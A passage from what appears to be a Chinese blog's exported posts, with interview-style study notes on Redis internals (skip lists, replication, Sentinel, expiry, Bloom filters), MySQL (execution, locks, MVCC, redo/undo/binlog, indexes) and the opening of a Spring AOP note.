几种数据类型做了整理：1）String：缓存、限流、分布式锁、计数器、分布式 Session 等。2）Hash：用户信息、用户主页访问量、组合查询等。3）List：简单队列、关注列表时间轴。4）Set：赞、踩、标签等。5）有序集合 ZSet：排行榜、好友关系链表。zset 是 Redis 中一个非常重要的数据结构，其底层是基于跳表（skip list） 实现的。跳表是一种随机化的数据结构，基于并联的链表，实现简单，插入、删除、查找的复杂度均为 O(logN)。简单说来跳表也是链表的一种，只不过它在链表的基础上增加了跳跃功能，正是这个跳跃的功能，使得在查找元素时，跳表能够提供 O(logN) 的时间复杂度。跳表为了避免每次插入或删除带来的额外操作，不要求上下相邻两层链表之间的节点个数有严格的对应关系，而是为每个节点随机出一个层数（level)。而且新插入一个节点不会影响其它节点的层数。因此，插入操作只需要修改插入节点前后的指针，而不需要对很多节点都进行调整。 zset为何不使用红黑树等平衡树？1）跳跃表范围查询比平衡树操作简单。 因为平衡树在查询到最小值的时还需要采用中序遍历去查询最大值。 而跳表只需要在找到最小值后，对第一层的链表遍历即可。2）平衡树的删除和插入需要对子树进行相应的调整，而跳表只需要修改相邻的节点即可。3）跳表和平衡树的查询操作都是O（logN）的时间复杂度。4）从整体上来看，跳表算法实现的难度要低于平衡树。 Redis主从复制1.全量复制发生节点: 在slave 从服务器初始化阶段，需要将master主服务器上的所有数据都复制一份，流程如下： 从服务器连接主服务器，并发送sycn命令 主服务器接收到sycn命令后，执行bgsave命令生成RDB文件，并且在缓冲区中记录之后所有的操作记录 master执行完bgsave后，master将RDB文件发送给slave，并在此阶段内继续在缓冲区内写操作 slave在接收到RDB文件前 ，会将自身的数据全部丢弃，载入RDB master发送完毕，会向slave 的缓冲区发 写入执行命令 slave 完成对RDB的载入，开始接受命令请求，并执行缓冲区的命令 2.增量复制其中有三个重要参数： 主服务器的偏移量和从服务器的复制偏移量（offset） 主服务器的复制积压缓冲区 服务器的运行ID（runID） 复制偏移量主节点和从节点分别维护一个复制偏移量（offset），代表的是主节点向从节点传递的字节数offset用于判断主从节点的数据库状态是否一致：如果二者offset相同，则一致；如果offset不同，则不一致，此时可以根据两个offset找出从节点缺少的那部分数据。例如，如果主节点的offset是1000，而从节点的offset是500，那么部分复制就需要将offset为501-1000的数据传递给从节点。而offset为501-1000的数据存储的位置，就是下面要介绍的复制积压缓冲区。 复制积压缓冲区复制积压缓冲区是由主节点维护的、固定长度的、先进先出(FIFO)队列，默认大小1MB；当主节点开始有从节点时创建，其作用是备份主节点最近发送给从节点的数据。注意，无论主节点有一个还是多个从节点，都只需要一个复制积压缓冲区。在命令传播阶段，主节点除了将写命令发送给从节点，还会发送一份给复制积压缓冲区，作为写命令的备份；除了存储写命令，复制积压缓冲区中还存储了其中的每个字节对应的复制偏移量（offset）。由于复制积压缓冲区定长且是先进先出，所以它保存的是主节点最近执行的写命令；时间较早的写命令会被挤出缓冲区。 从节点将offset发送给主节点后，主节点根据offset和缓冲区大小决定能否执行部分复制： 如果offset偏移量之后的数据，仍然都在复制积压缓冲区里，则执行部分复制； 如果offset偏移量之后的数据已不在复制积压缓冲区中（数据已被挤出），则执行全量复制。 哨兵模式哨兵模式下主观下线/客观下线 在默认情况下，Sentinel会以每秒一次的频率向所有与他创建了连接的实例（包括主服务器、从服务器、其他Sentinel）发送PING命令，通过PING的返回值判断实例是否在线 回复+PONG、-LOADING、-MASTERDOWN、则有效 除以上三个之外的回复或者规定时间内down-after-milliseconds时间内没有回复则主观下线 当判断主观下线后，会对其他Sentinel进行询问，当一半以上觉得主观下线的话，视为客观下线 选出新的主服务器 先判断slave节点与master节点断开的时长，如果超过指定（down-after-milliseconds * 10）则会排除该节点 判断slave节点的slave-priority,数字越小优先级越高，0则是用不参加选举 如果有多个相同最高优先级的，则选出其中偏移量offset最大的从服务器 最后判断运行ID，选出ID最小的服务器 故障转移 选中以后，sentinel会给备选的slave发送slaveof no one，让该节点变为master 广播其他从节点，发送slaveof 新的ip 新的端口号给其他的从节点，让这些slave成为新的master的从节点，开始从新的master上同步数据 sentinel将故障节点标记为slave，当故障节点恢复后会自动成为新的master的slave（直接修改配置文件为slaveof 新的ip 新的端口号） 集群模式哈希槽Redis集群通过分片的方式保存键值对：集群被分为16384个槽（slot），数据库中每个键都属于其中的一个。每个槽都必须有节点在处理。 数据key不与节点绑定，而是与插槽绑定。 key中包含{}且至少有一个字符，则{}中为有效部分 不包含{}则 key 都是有效部分 key是{itcast}num，根据itcast计算，计算方式是CRC16算法得到一个hash值，然后%16384得到最后slot 删除机制惰性删除在读写key时才判断是否过期，如果过期就删除掉，属于将删除环节后置了，这样避免了轮询但是要增加了内存的占用。极端情况下如果某些体积非常大的key一直没有被访问，那么将占用内存很久，无疑在内存紧张的情况下对性能产生影响 定期删除在主节点执行ServerCron任务定时扫描需要被删掉的key，节约了空间，但是使用了轮询消耗一定的CPU，因此在需要被删除键很多且CPU资源不富裕的情况下，对Redis服务的性能会产生影响。 定时删除在设置键的过期时间的同时，创建一个定时器（timer），让定时器在键的过期时间来临时，立即执行对键的删除操作。不现实。浪费cpu 在实际中Redis将惰性删除作为默认开启，定期删除可以通过配置来进行设定删除频率和内存阈值触发等，算是个折中的选择 **单线程删除阻塞问题** Redis作为一个单线程模型的服务，当执行一些耗时的命令时，比如使用DEL删除一个value特别大的key时，或使用FLUSHDB 和 FLUSHALL 进行清库操作，都会造成redis阻塞，从而降低性能甚至发生故障转移 **异步删除命令** UNLINK是DEL的异步删除版本，UNLINK命令与DEL阻塞删除不同，UNLINK在删除集合类键时，如果集合键的元素个数大于64个，会把真正的内存释放操作，给单独的BackgroundIO线程来操作，有实验表明使用UNLINK命令删除一个大键mylist, 它包含200万个元素，但用时只有数毫秒。 通过对FLUSHALL/FLUSHDB添加ASYNC异步清理选项，redis在清理整个实例或DB时，操作也都是异步的，有实验数据表明异步清理200w数据耗时也只有数毫秒。 综上可知，采用UNLINK、FLUSHALL、FLUSHDB代替之前的阻塞删除命令可以使处理相同数据的耗时从传统秒级、甚至分钟级降低到目前的微妙，毫秒级，确实是个巨大的飞跃，或许这也是Redis直接从3.x飞跃到4.0的原因。 布隆过滤器假如现在有三个哈希函数分别为**h1,h2,h3,**同时有三个输入x,y,z。三个输入分别通过h1-h3进行哈希计算出对应整数之后，对bitarray的长度进行取模运算，获取对应下标再进行置1，这样运算三次就形成了如图的bitmap结构：布隆过滤器检索时，使用相同的哈希函数进行计算出对应的bit位置，只要看这些位置的值，如果这些位置有任何一个0，则被检元素一定不在；如果都是1，则被检元素可能存在。 一句话概率就是有0一定不存在、全1不一定存在。不支持删除值，可以通过业务逻辑排除 误算率是其中之一，随着存入的元素数量增加，误算率随之增加，但是如果元素数量太少，则使用散列表足够。另外一般情况下不能从布隆过滤器中删除元素。 Redis淘汰策略 Redis为什么采用跳表而不是红黑树在做范围查找的时候，平衡树比skiplist操作要复杂。在平衡树上，我们找到指定范围的小值之后，还需要以中序遍历的顺序继续寻找其它不超过大值的节点。如果不对平衡树进行一定的改造，这里的中序遍历并不容易实现。而在skiplist上进行范围查找就非常简单，只需要在找到小值之后，对第1层链表进行若干步的遍历就可以实现。 平衡树的插入和删除操作可能引发子树的调整，逻辑复杂，而skiplist的插入和删除只需要修改相邻节点的指针，操作简单又快速。从内存占用上来说，skiplist比平衡树更灵活一些。 一般来说，平衡树每个节点包含2个指针（分别指向左右子树），而skiplist每个节点包含的指针数目平均为1/(1-p)，具体取决于参数p的大小。如果像Redis里的实现一样，取p=1/4，那么平均每个节点包含1.33个指针，比平衡树更有优势。 查找单个key，skiplist和平衡树的时间复杂度都为O(log n)，大体相当；而哈希表在保持较低的哈希值冲突概率的前提下，查找时间复杂度接近O(1)，性能更高一些。所以我们平常使用的各种Map或dictionary结构，大都是基于哈希表实现的。从算法实现难度上来比较，skiplist比平衡树要简单得多。 Redis为什么这么快Redis基于Reactor模式开发了自己的网络事件处理器：这个处理器被称为文件事件处理器（file event handler）： 文件事件处理器使用I/O多路复用（multiplexing）程序来同时监听多个套接字，并根据套接字目前执行的任务来为套接字关联不同的事件处理器。 当被监听的套接字准备好执行连接应答（accept）、读取（read）、写入（write）、关闭（close）等操作时，与操作相对应的文件事件就会产生，这时文件事件处理器就会调用套接字之前关联好的事件处理器来处理这些事件。 1、完全基于内存，绝大部分请求是纯粹的内存操作，非常快速。数据存在内存中，类似于HashMap，HashMap的优势就是查找和操作的时间复杂度都是O(1)；2、数据结构简单，对数据操作也简单，Redis中的数据结构是专门进行设计的；3、采用单线程，避免了不必要的上下文切换和竞争条件，也不存在多进程或者多线程导致的切换而消耗 CPU，不用去考虑各种锁的问题，不存在加锁释放锁操作，没有因为可能出现死锁而导致的性能消耗；4、使用多路I/O复用模型，非阻塞IO；多路I/O复用模型是利用 select、poll、epoll 可以同时监察多个流的 I/O 事件的能力，在空闲的时候，会把当前线程阻塞掉，当有一个或多个流有 I/O 事件时，就从阻塞态中唤醒，于是程序就会轮询一遍所有的流（epoll 是只轮询那些真正发出了事件的流），并且只依次顺序的处理就绪的流，这种做法就避免了大量的无用操作。这里“多路”指的是多个网络连接，“复用”指的是复用同一个线程。采用多路 I/O 复用技术可以让单个线程高效的处理多个连接请求（尽量减少网络 IO 的时间消耗），且 Redis 在内存中操作数据的速度非常快，也就是说内存内的操作不会成为影响Redis性能的瓶颈，主要由以上几点造就了 Redis 具有很高的吞吐量。5、使用底层模型不同，它们之间底层实现方式以及与客户端之间通信的应用协议不一样，Redis直接自己构建了VM 机制 ，因为一般的系统调用系统函数的话，会浪费一定的时间去移动和请求； 动态字符串SDS（保存单个字符串） IntSet（整数集合）","link":"/2022/05/22/Redis/"},{"title":"MySQL","text":"Mysql索引、Mysql优化、日志 执行一条 select 语句，期间发生了什么？第一步：连接器连接的过程需要先经过 TCP 三次握手，因为 MySQL 是基于 TCP 协议进行传输的 第二步：查询缓存对于更新比较频繁的表，查询缓存的命中率很低的，因为只要一个表有更新操作，那么这个表的查询缓存就会被清空。如果刚缓存了一个查询结果很大的数据，还没被使用的时候，刚好这个表有更新操作，查询缓冲就被清空了，相当于缓存了个寂寞。所以，MySQL 8.0 版本直接将查询缓存删掉了，也就是说 MySQL 8.0 开始，执行一条 SQL 查询语句，不会再走到查询缓存这个阶段了。对于 MySQL 8.0 之前的版本，如果想关闭查询缓存，我们可以通过将参数 query_cache_type 设置成 DEMAND 第三步：解析 SQL解析器第一件事情，词法分析。MySQL 会根据你输入的字符串识别出关键字出来，构建出 SQL 语法树，这样方面后面模块获取 SQL 类型、表名、字段名、 where 条件等等。第二件事情，语法分析。根据词法分析的结果，语法解析器会根据语法规则，判断你输入的这个 SQL 语句是否满足 MySQL 语法。 第四步：执行 SQL预处理器我们先来说说预处理阶段做了什么事情。 检查 SQL 查询语句中的表或者字段是否存在； 将 select * 中的 * 符号，扩展为表上的所有列优化器经过预处理阶段后，还需要为 SQL 查询语句先制定一个执行计划，这个工作交由「优化器」来完成的。 优化器主要负责将 SQL 查询语句的执行方案确定下来，比如在表里面有多个索引的时候，优化器会基于查询成本的考虑，来决定选择使用哪个索引。 逻辑优化查询：怎么查询效率更高 物理优化查询：索引等 执行器经历完优化器后，就确定了执行方案，接下来 MySQL 就真正开始执行语句了，这个工作是由「执行器」完成的。在执行的过程中，执行器就会和存储引擎交互了，交互是以记录为单位的。接下来，用三种方式执行过程，跟大家说一下执行器和存储引擎的交互过程（PS ：为了写好这一部分，特地去看 MySQL 源码，也是第一次看哈哈）。 主键索引查询 全表扫描 索引下推 总结执行一条 SQL 查询语句，期间发生了什么？ 连接器：建立连接，管理连接、校验用户身份； 查询缓存：查询语句如果命中查询缓存则直接返回，否则继续往下执行。MySQL 8.0 已删除该模块； 解析 SQL，通过解析器对 SQL 查询语句进行词法分析、语法分析，然后构建语法树，方便后续模块读取表名、字段、语句类型； 执行 SQL：执行 SQL 共有三个阶段： 预处理阶段：检查表或字段是否存在；将 select * 中的 * 符号扩展为表上的所有列。 优化阶段：基于查询成本的考虑， 选择查询成本最小的执行计划； 执行阶段：根据执行计划执行 SQL 查询语句，从存储引擎读取记录，返回给客户端； Mysql explain 执行计划 事务的四大特性？事务特性ACID：原子性（Atomicity）、一致性（Consistency）、隔离性（Isolation）、持久性（Durability）。 原子性是指事务包含的所有操作要么全部成功，要么全部失败回滚。 一致性是指一个事务执行之前和执行之后都必须处于一致性状态。比如a与b账户共有1000块，两人之间转账之后无论成功还是失败，它们的账户总和还是1000。 隔离性。跟隔离级别相关，如read committed，一个事务只能读到已经提交的修改。 持久性是指一个事务一旦被提交了，那么对数据库中的数据的改变就是永久性的，即便是在数据库系统遇到故障的情况下也不会丢失提交事务的操作。数据库范式 一范式、二范式、三范式、巴斯-科德范式、第四范式、第五范式（完美范式）「第一范式」：数据库中的字段具有「原子性」，不可再分，并且是单一职责 国家 省 市 区 街道 中国 上海 上海 宝山区 上大路99号 「第二范式」：「建立在第一范式的基础上」，第二范式要求数据库表中的每个实例或行必须「可以被唯一地区分」。为实现区分通常需要为表加上一个列，以存储各个实例的惟一标识。这个惟一属性列被称为主键。（任何字段只能依赖主键） 订单编号 商品编号 用户ID 下单时间 商品名称 4654641666 4553 2424 2022-07-04 洗衣机 很显然，商品名称和订单无关，商品名称是依赖商品编号的，这是部分依赖！不应该放在同一张表格里面，应该拆成订单表和商品表。「第三范式」：「建立在第一，第二范式的基础上」，确保每列都和主键列直接相关，而不是间接相关不存在其他表的非主键信息其中总价是通过前面两个字段计算得到，数据库不要有数学计算的操作，业务需要的时候通过代码进行计算，不要入库 商品 单价 数量 总价 12456 10 50 500 但是在我们的日常开发当中，「并不是所有的表一定要满足三大范式」，有时候冗余几个字段可以少关联几张表，带来的查询效率的提升有可能是质变的 Order By 为什么会导致索引失效 字段： a\\b\\c\\d,索引：b\\c\\d 1EXPLAIN SELECT * FROM t1 ORDER BY b,c,d; 走bcd，不需要排序，n次回表 全表扫描，内存里排库 + 不用回表MySQL锁的类型 基于锁的分类：共享锁、排他锁 基于锁的粒度：行级锁、表级锁、页级锁、记录锁、间隙锁、临键锁 基于锁的状态：意向共享锁、意向排他锁 表级锁具体内容 表锁 123lock tables 表名…… read/writelock tables 表共享读锁 表独占写锁 元数据锁（共享锁）：在select和update时候都会自动加上 系统自动，无需显示使用，访问一张表会自动加上。当这张表上有未提交的事物，就不能修改表结构，被阻塞 意向锁 一个线程A给一行加了锁。另一个线程B想给整张表加锁，此时会有问题，B就要一帮一行找A给哪一行加了锁，很麻烦。 修改：在A给表加行锁的时候还会有一把意向锁，B要给表上锁的时候就会和意向锁进行兼容，兼容就说明可以给表上锁，否则不行，会处于阻塞状态，直到A行锁释放意向锁释放，B给表上锁 意向锁分为两种：意向共享锁和意向排他锁 意向共享锁：与表锁共享锁兼容，与表锁排他锁互斥 意向排他锁：与表锁共享锁、表锁排他锁互斥行级锁具体内容 行锁 共享锁： 排他锁： 间隙锁（一个范围，不包含该记录），确保索引间隙不变，防止其他事务在这个间隙进行insert导致幻读 临键锁：行锁+间隙锁，同时锁住数据和间隙 MySQL数据库中什么情况下索引无法使用 不符合最左匹配原则 字段进行了隐私数据类型转化 走索引没有全表扫描效率高 为什么B+树比B树更适合实现数据库索引？ 由于B+树的数据都存储在叶子结点中，叶子结点均为索引，方便扫库，只需要扫一遍叶子结点即可，但是B树因为其分支结点同样存储着数据，我们要找到具体的数据，需要进行一次中序遍历按序来扫，所以B+树更加适合在区间查询的情况，而在数据库中基于范围的查询是非常频繁的，所以通常B+树用于数据库索引。 B+树的节点只存储索引key值，具体信息的地址存在于叶子节点的地址中。这就使以页为单位的索引中可以存放更多的节点。减少更多的I/O支出。 B+树的查询效率更加稳定，任何关键字的查找必须走一条从根结点到叶子结点的路。所有关键字查询的路径长度相同，导致每一个数据的查询效率相当。 MyISAM和InnoDB myISAM InnoDB 不支持事务，每次查询都是原子的 ACID，事务，支持四种隔离级别 表锁 行锁，支持并发写 无MVCC MVCC 三个文件：索引文件、表结构文件、数据文件 除了主键以外，其他索引只存储索引内容 存储了表的总行数 没有存表行数 索引数据分开 主键索引文件存了所有的数据 注意：MyISAM引擎的主键索引，B+数的叶子节点存储的是主键和 什么是MVCC MVCC 多版本并发控制，读取的时候通过快照的方式将数据存下来，这样读锁写锁不冲突，不同事物session会看到自己的版本链 MVCC只在已提交读和可重复读两个隔离级别下工作 InnoDB在每行数据都增加三个隐藏字段，一个唯一行号，一个记录创建的版本号，一个记录回滚的版本号。 聚簇索引记录中有3个隐藏列 trx_id 和roll_pointer和ROW_ID trx_id：用来存储每一次对某条聚簇索引记录修改时的事务id roll_pointer：修改时，将老版本写入undo log中，roll_pointer存了一个指针，指向上一个版本记录的位置，通过它来获得上一条记录的信息 ROW_ID：隐藏主键，如果表结构没有指定主键，将会生成隐藏字段 已提交读和可重复读的区别在于他们生成的ReadView策略不同 开始事务时创建ReadView，维护事务的id（即未提交的事务），排成一个数组 已提交读：事务每次查询开始都声称一个独立的ReadView 可重复读：第一次读的时候生成一个ReadView，之后复用之前的ReadView 通过版本链实现并发读写。通过ReadView生成策略的不同实现不同的隔离级别 什么是脏读、幻读、不可重复读 脏读：一个事务修改了一个值，但是需要回滚 回滚前另一个事务读到了被修改后的值 幻读：一个事务插入了一条数据。插入前后另一个事务分别读取，读取的记录数不一样 不可重复读：一个事务修改前后，另一个事务读到的数据不一致 事务的基本特性和隔离级别 ACID 原子性：全执行/不执行 一致性： 隔离性：事务事物之间互不干扰 持久性：写在磁盘 隔离级别 读未提交：脏读 幻读 不可重复读 读已提交：幻读 不可重复读 可重复读：幻读(可通过临键锁解决) 串行化：（大量的锁 容易导致死锁）事务的实现原理事务是基于重做日志文件(redo log)和回滚日志(undo log)实现的。每提交一个事务必须先将该事务的所有日志写入到重做日志文件进行持久化，数据库就可以通过重做日志来保证事务的原子性和持久性。每当有修改事务时，还会产生undo log，如果需要回滚，则根据undo log 的反向语句进行逻辑操作，比如insert一条记录就delete一条记录。undo log主要实现数据库的一致性。 索引分类 功能逻辑上：普通索引、唯一索引、全文索引、单列索引 物理实现：聚簇索引、非聚簇索引 作用字段个数：单列索引、联合索引 普通索引：可以在任何数据类型唯一索引：该值必须唯一，允许有空值，比如邮箱、身份证、手机号主键索引：聚簇索引、非聚簇索引单列索引：一个字段联合索引：idx_id_name_gender 多个字段，使用要遵守最左前缀原则 什么是索引覆盖SQL执行的时候可以利用索引快速查找。字段在索引中都包含了，不需要回表，所有数据都在叶子节点上. 理解方式1：索引是高校找到行的一个方法，但是一般数据库也能使用索引找到一个列的数据，因此他不必读取整个行，毕竟索引叶子节点储存了他们的索引数据，当能通过读取索引就可以得到想要的数据，那就不需要读取行了，一个索引包含了满足查询结果的所有数据就叫组覆盖索引 理解方式2：非聚簇复合索引的一种形式，它包括在查询里的SELECT、JOIN、WHERE子句中做到所有列（即建索引的字段正好是覆盖查询条件中所涉及的字段） 简单地说就是：索引列+主键 包含SELECT到FROM之间的查询列 聚集索引、非聚集索引 InnoDB中，主键索引和每一条数据都放在同一个文件中。聚集索引的叶子节点包含了完整的数据记录 MyISAM的索引和主键分别放在myi和myd中，每次查询的时候从myi查到数据的存放位置，然后去myd中查出来，类似于一种回表的操作 聚簇索引和二级索引另外，索引又可以分成聚簇索引和非聚簇索引（二级索引），它们区别就在于叶子节点存放的是什么数据： 聚簇索引的叶子节点存放的是实际数据，所有完整的用户记录都存放在聚簇索引的叶子节点； 二级索引的叶子节点存放的是主键值，而不是实际数据。 因为表的数据都是存放在聚簇索引的叶子节点里，所以 InnoDB 存储引擎一定会为表创建一个聚簇索引，且由于数据在物理上只会保存一份，所以聚簇索引只能有一个。InnoDB 在创建聚簇索引时，会根据不同的场景选择不同的列作为索引： 如果有主键，默认会使用主键作为聚簇索引的索引键； 如果没有主键，就选择第一个不包含 NULL 值的唯一列作为聚簇索引的索引键； 在上面两个都没有的情况下，InnoDB 将自动生成一个隐式自增 id 列作为聚簇索引的索引键； 一张表只能有一个聚簇索引，那为了实现非主键字段的快速搜索，就引出了二级索引（非聚簇索引/辅助索引），它也是利用了 B+ 树的数据结构，但是二级索引的叶子节点存放的是主键值，不是实际数据。二级索引的 B+ 树如下图，数据部分为主键值：因此，如果某个查询语句使用了二级索引，但是查询的数据不是主键值，这时在二级索引找到主键值后，需要去聚簇索引中获得数据行，这个过程就叫作「回表」，也就是说要查两个 B+ 树才能查到数据。不过，当查询的数据是主键值时，因为只在二级索引就能查询到，不用再去聚簇索引查，这个过程就叫作「索引覆盖」，也就是只需要查一个 B+ 树就能找到数据。 MySQL三大日志(binlog、redo log和undo log)详解 redo log:（重做日志）是InnoDB存储引擎独有的，它让MySQL拥有了崩溃恢复能力。 比如 MySQL 实例挂了或宕机了，重启时，InnoDB存储引擎会使用redo log恢复数据，保证数据的持久性与完整性。 MySQL 中数据是以页为单位，你查询一条记录，会从硬盘把一页的数据加载出来，加载出来的数据叫数据页，会放入到 Buffer Pool 中。 后续的查询都是先从 Buffer Pool 中找，没有命中再去硬盘加载，减少硬盘 IO 开销，提升性能。 更新表数据的时候，也是如此，发现 Buffer Pool 里存在要更新的数据，就直接在 Buffer Pool 里更新。 然后会把“在某个数据页上做了什么修改，比如页号xxx,偏移量yyy，写入了zzz数据”记录到重做日志缓存（redo log buffer）里，接着刷盘到 redo log 文件里。（物理级别的修改） binlog redo log 它是物理日志，记录内容是“在某个数据页上做了什么修改”，属于 InnoDB 存储引擎。 而 binlog 是逻辑日志，记录内容是语句的原始逻辑，类似于“给 ID=2 这一行的 c 字段加 1”，属于MySQL Server 层。 在事务执行的过程中，redo log会不断顺序记录，直到这个给事务提交，才会一次性写到bin log 中。 undo log 我们知道如果想要保证事务的原子性，就需要在异常发生时，对已经执行的操作进行回滚，在 MySQL 中，恢复机制是通过 回滚日志（undo log） 实现的，所有事务进行的修改都会先记录到这个回滚日志中，然后再执行相关的操作。如果执行过程中遇到异常的话，我们直接利用 回滚日志 中的信息将数据回滚到修改之前的样子即可！并且，回滚日志会先于数据持久化到磁盘上。这样就保证了即使遇到数据库突然宕机等情况，当用户再次启动数据库的时候，数据库还能够通过查询回滚日志来回滚将之前未完成的事务。 另外，MVCC 的实现依赖于：隐藏字段、Read View、undo log。在内部实现中，InnoDB 通过数据行的 DB_TRX_ID 和 Read View 来判断数据的可见性，如不可见，则通过数据行的 DB_ROLL_PTR 找到 undo log 中的历史版本。每个事务读到的数据版本可能是不一样的，在同一个事务中，用户只能看到该事务创建 Read View 之前已经提交的修改和该事务本身做的修改 MySQL InnoDB 引擎使用 redo log(重做日志) 保证事务的持久性，使用 undo log(回滚日志) 来保证事务的原子性。Mysql主从复制 (1) 为什么要做主从复制？1、在业务复杂的系统中，有这么一个情景，有一句sql语句需要锁表，导致暂时不能使用读的服务，那么就很影响运行中的业务，使用主从复制，让主库负责写，从库负责读，这样，即使主库出现了锁表的情景，通过读从库也可以保证业务的正常运作。2、做数据的热备3、架构的扩展。业务量越来越大，I/O访问频率过高，单机无法满足，此时做多库的存储，降低磁盘I/O访问的频率，提高单个机器的I/O性能。(2) 什么是mysql的主从复制MySQL 主从复制是指数据可以从一个MySQL数据库服务器主节点复制到一个或多个从节点。MySQL 默认采用异步复制方式，这样从节点不用一直访问主服务器来更新自己的数据，数据的更新可以在远程连接上进行，从节点可以复制主数据库中的所有数据库或者特定的数据库，或者特定的表。(3) 主从复制原理 master服务器将数据的改变记录在二进制binlog日志上，当master上的数据发生改变时，将其写入二进制文件中; slave服务器会在一定时间间隔内对master二进制日志进行探测是否发生改变，如果发生改变，则开始一个I/O Thread请求master二进制事件 同时主节点为每个I/O线程启动一个dump线程，用于向其发送二进制时间，并保存至 从节点 本地的中继日志中，从节点 将启动sql线程从中继日志中读取二进制日志，在本地释放，使得其数据和主节点的保持一致，最后I/OThread和SQLThread将进入睡眠状态，等待下一次被唤醒。 简单说： 从库会生成两个线程,一个I/O线程,一个SQL线程; 主库会生成一个log dump线程,用来给从库I/O线程传binlog; I/O线程会去请求主库的binlog,并将得到的binlog写到本地的relay-log(中继日志)文件中; SQL线程,会读取relay log文件中的日志,并解析成sql语句逐一执行。 Innodb如何实现事务（update语句为例） Buffer Pool: update语句—&gt; 找到数据所在页-&gt; 缓存在Buffer Pool中 执行update语句 修改Buffer pool中的数据 针对update语句生成redolog对象，存入logBuffer中 针对update语句生成undo日志作为回滚使用 如果事务提交，Redolog持久化，后续有机制将BufferPool 中所修改的数据页持久化到磁盘中 如果事务回滚，则用undo日志进行回滚 Innodb 事务为什么要两阶段提交? 两段式提交，就是我们先把这次更新写入到redolog中，并设redolog为prepare状态，然后再写入binlog,写完binlog之后再提交事务，并设redolog为commit状态。也就是把redolog拆成了prepare和commit两段！ 其实redolog是后来才加上的，binlog是之前就有的。一开始存储引擎只有MyISAM,后来才有的InnoDB,然后MyISAM没有事务，没有crash-safe的能力。所以InnoDB搞了个redolog。然后为了保证两份日志同步，所以才有了两段式提交。 你假设一下如果先保存好redolog,然后再记录binlog。如果redolog写好了之后挂了。ok你看起来好像是没问题了，但是你的binlog还没记录，所以这条记录就少了！如果你备份这份binlog之后，你这条记录就永远的少了！ 那如果先写binlog再写redolog呢？那binlog写完了，你数据库挂了，那redolog是不是没有，没有的意思就是你以前你没更新成功。但是binlog已经记录好了，在它那边反正是成功了，所以那备份的binlog也不对！ WAl 是什么?有什么好处?WAI主要先写日志、再写磁盘 WAL(Write Ahead Log)预写日志，是数据库系统中常见的一种手段，用于：1、保证数据操作的原子性和持久性。2、使得随机写变为顺序写提高性能。WAL 的优点： 读和写可以完全地并发执行，不会互相阻塞（但是写之间仍然不能并发）。 WAL 在大多数情况下，拥有更好的性能（因为无需每次写入时都要写两个文件）。 磁盘 I/O 行为更容易被预测。 使用更少的 fsync()操作，减少系统脆弱的问题。 什么是索引下推? INDEX CONDITION PUSHDOWN索引下推是 MySQL 5.6 版本中提供的一项索引优化功能，可以在非聚簇索引遍历过程中，对索引中包含的字段先做判断，过滤掉不符合条件的记录，减少回表次数。例如： 1EXPLAIN SELECT * FROM S1 WHERE key1 &gt; 'z' AND key1 LIKE '%a'; 对于我们理解的而言，查询的顺序应该是： 先找到 key1 &gt; ‘z’的行，然后回表查询，最后筛选key1 LIKE ‘%a’的数据返回 但是对于查询优化器而言： 先找到 key1 &gt; ‘z’的行，这个时候先不回表，继续执行key1 LIKE ‘%a’，直接在索引中挑选出来，最后把符合这两个条件的数据进行回表查找。此时减少了回表的次数 例如：索引为zipcode,lastname,address 联合索引 索引中包含了后面查询田中的字段，在回表前索引下推机制是会先做判断的 一条 Sql 语句查询偶尔慢会是什么原因? 数据库刷新脏页当我们要往数据库中插入一条数据或者更新一条数据时，数据库会在内存中把对应字段的数据更新了，但是更新完毕之后，这些更新的字段并不会马上同步持久化到磁盘中去，而是把这些更新的记录写入到redo log日志中去，只有等到空闲的时候才会通过redo log里的日志把最新的数据同步到磁盘里。这里redo log的容量是有限的，所以如果数据库一直很忙且更新有很频繁，那么这个时候redo log很快就会被写满，从而没办法等到空闲时再把数据同步到磁盘，只能暂停其他操作，全身心来把数据同步到磁盘中去，造成的表象就是我们平时正常的SQL语句突然会执行的很慢。也就是说，数据库在同步数据到磁盘的时候就有可能会导致我们的SQL语句执行的很慢。 无法获取锁资源执行的时候遇到了表锁或者行锁。如果我们要执行的SQL语句，其涉及到的表正好别人在用并且加锁了，或者表并没有加锁，但是要使用到的某一行被加锁了，那么我们便无法获取锁，只能慢慢等待别人释放锁了。如果要判断是否真的在等待锁资源，我们可以使用”show processlist”命令来查看当前的状态。主从延迟要怎么解决? 分库，将一个主库拆分为多个主库，每个主库的写并发就减少了几倍，此时主从延迟可以忽略不计。 打开 MySQL 支持的并行复制，多个库并行复制。如果说某个库的写入并发就是特别高，单库写并发达到了 2000/s，并行复制还是没意义。 重写代码，写代码的同学，要慎重，插入数据时立马查询可能查不到。 如果确实是存在必须先插入，立马要求就查询到，然后立马就要反过来执行一些操作，对这个查询设置直连主库。不推荐这种方法，你要是这么搞，读写分离的意义就丧失了。 删除表数据后表的大小却没有变动,这是为什么?1、释放这些空间的操作本身就需要时间，如果每次删除数据都去进行这个操作，显然会影响性。2、第二个原因则是因为表里后续还是会有新的数据插入，这些删除的数据空间可以在新的数据插入进来后重新利用即可，这样也避免了新增数据要去重新申请新的空间。 为什么 VarChar 建议不要超过255?首先VARCHAR不是定长的，而是可变的，所以一般业务开发我们都要尽量使用最小的长度来满足需求，以免浪费空间，影响性能，而既然是可变的长度，那就得有保存长度的地方，所以如果VARCHAR的长度设置在255以下，那只会使用额外一个字节来保存长度，但是如果VARCHAR的长度设置在255以上，那么就会使用额外的两个字节来保存长度，无形中就浪费了存储空间。 Redis和MySQL如何保证数据的一致性问题：一份数据同时保存在数据库里和redis里面，数据发生变化的时候redis和MySQL变化是有先后顺序的 先更新数据库再更新缓存/先更新缓存再更新数据库 一个改还没同步，另一个查 不一致 先删除缓存再更新数据库 延时双删 保证高一致性：MQ手动应答确保redis删除Canal组件监听binlog日志","link":"/2022/05/20/Mysql/"},{"title":"Spring","text":"Spring、Mybatis 谈谈对AOP的理解 系统是由许多不同的组件所组成的，每一个组件各负责一块特定功能。除了实现自身校心功能之外，这些组件还经常承担者额外的指责。例如日志，事务管理和安全这样的核心服务经第融入到自身具有校心业务理相的组件中去。这些系统服务经第被称为横切关注点，因为它们会路越系統的多个组件。 当我们需要为分散的对象引入公共行为的时候，OOP则显得无能为力，也就是说，OOP允许你定义从上到下的关系，但井不适合定义从左到右的关系，例如日志功能。 日志代码往往水平地散布在所有层次中，而与它所散布到的对象的校心功能无关系。 在OOP设计中，已导致了大量代码的重复，而不利于各个模块的重用。 